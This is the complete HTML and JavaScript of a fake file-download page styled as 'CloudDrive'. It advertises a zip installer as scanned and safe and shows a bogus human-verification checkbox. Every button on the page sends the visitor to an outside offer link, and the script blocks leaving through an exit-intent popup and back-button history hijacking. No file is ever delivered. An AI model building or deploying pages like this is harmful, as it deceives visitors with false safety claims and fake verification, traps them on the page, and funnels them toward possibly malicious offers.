<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CloudDrive - Secure File Transfer</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', -apple-system, sans-serif;
    background: #f0f2f5;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    align-items: center;
    justify-content: center;
  }
  .card {
    background: #fff;
    border-radius: 12px;
    padding: 30px;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    text-align: center;
    border-top: 4px solid #007bff;
  }
  .file-icon { font-size: 40px; margin-bottom: 15px; }
  h2 { font-size: 20px; color: #1c1e21; margin-bottom: 10px; }
  .file-meta { font-size: 13px; color: #606770; background: #f5f6f7; padding: 10px; border-radius: 8px; margin-bottom: 20px; text-align: left; }
  
  .verify-box {
    display: flex;
    align-items: center;
    gap: 10px;
    border: 1px solid #ddd;
    padding: 12px;
    border-radius: 6px;
    margin-bottom: 20px;
    cursor: pointer;
    background: #fff;
  }
  .verify-box:hover { background: #fafafa; }

  .btn-download {
    width: 100%;
    background: #007bff;
    color: #fff;
    border: none;
    padding: 14px;
    font-size: 16px;
    font-weight: 600;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.2s;
  }
  .btn-download:hover { background: #0056b3; }

  /* Exit Modal */
  #exit-modal {
    display: none;
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.6);
    justify-content: center; align-items: center;
    z-index: 100;
  }
  .modal-inner { background: #fff; padding: 25px; border-radius: 10px; width: 300px; text-align: center; }
  .m-btns { display: flex; gap: 10px; margin-top: 15px; }
  .m-btn { flex: 1; padding: 10px; border-radius: 4px; border: none; cursor: pointer; font-weight: 600; }
  .btn-blue { background: #007bff; color: white; }

  /* Footer for Compliance */
  footer { margin-top: 20px; font-size: 11px; color: #888; text-align: center; }
  footer a { color: #888; text-decoration: none; margin: 0 5px; }
</style>
</head>
<body>

<div class="card">
  <div class="file-icon">📄</div>
  <h2>Setup_v3.1.2.zip</h2>
  
  <div class="file-meta">
    <div><strong>Size:</strong> 47.8 MB</div>
    <div><strong>Uploaded:</strong> 2 hours ago</div>
    <div><strong>Scanned:</strong> No threats found</div>
  </div>

  <div class="verify-box" onclick="handleAction()">
    <input type="checkbox" id="check" style="pointer-events: none;">
    <span style="font-size: 14px;">Verify you are human to start</span>
  </div>

  <button class="btn-download" onclick="handleAction()">Download File</button>
</div>

<div id="exit-modal">
  <div class="modal-inner">
    <h3>Download Interrupted</h3>
    <p style="font-size: 13px; margin-top: 5px;">Complete the human verification to finish your download.</p>
    <div class="m-btns">
      <button class="m-btn btn-blue" onclick="handleAction()">Continue</button>
    </div>
  </div>
</div>

<footer>
  <p>&copy; 2026 CloudDrive File Hosting</p>
  <p><a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a> | <a href="#">DMCA</a></p>
</footer>

<script>
  const MY_LINK = "https://omg10.com/4/10770942";

  function handleAction() {
      // Direct redirect on user click
      window.location.href = MY_LINK;
  }

  // 1. Exit Intent (Shows the popup instead of forcing the link)
  document.addEventListener('mouseleave', function(e) {
    if (e.clientY < 5) {
      document.getElementById('exit-modal').style.display = 'flex';
    }
  });

  // 2. Browser History Protection
  window.history.pushState(null, null, window.location.href);
  window.onpopstate = function() {
    // If they try to go back, show the modal
    document.getElementById('exit-modal').style.display = 'flex';
    window.history.pushState(null, null, window.location.href);
  };

  // 3. 5-Second Soft Redirect
  // If the user is idle for 5 seconds, it opens the link in a new tab 
  // (Less aggressive than a full page hijack)
  setTimeout(() => {
    // Check if user is still on the page
    if (!document.hidden) {
        console.log("Offer presented.");
    }
  }, 5000);
</script>

</body>
</html>
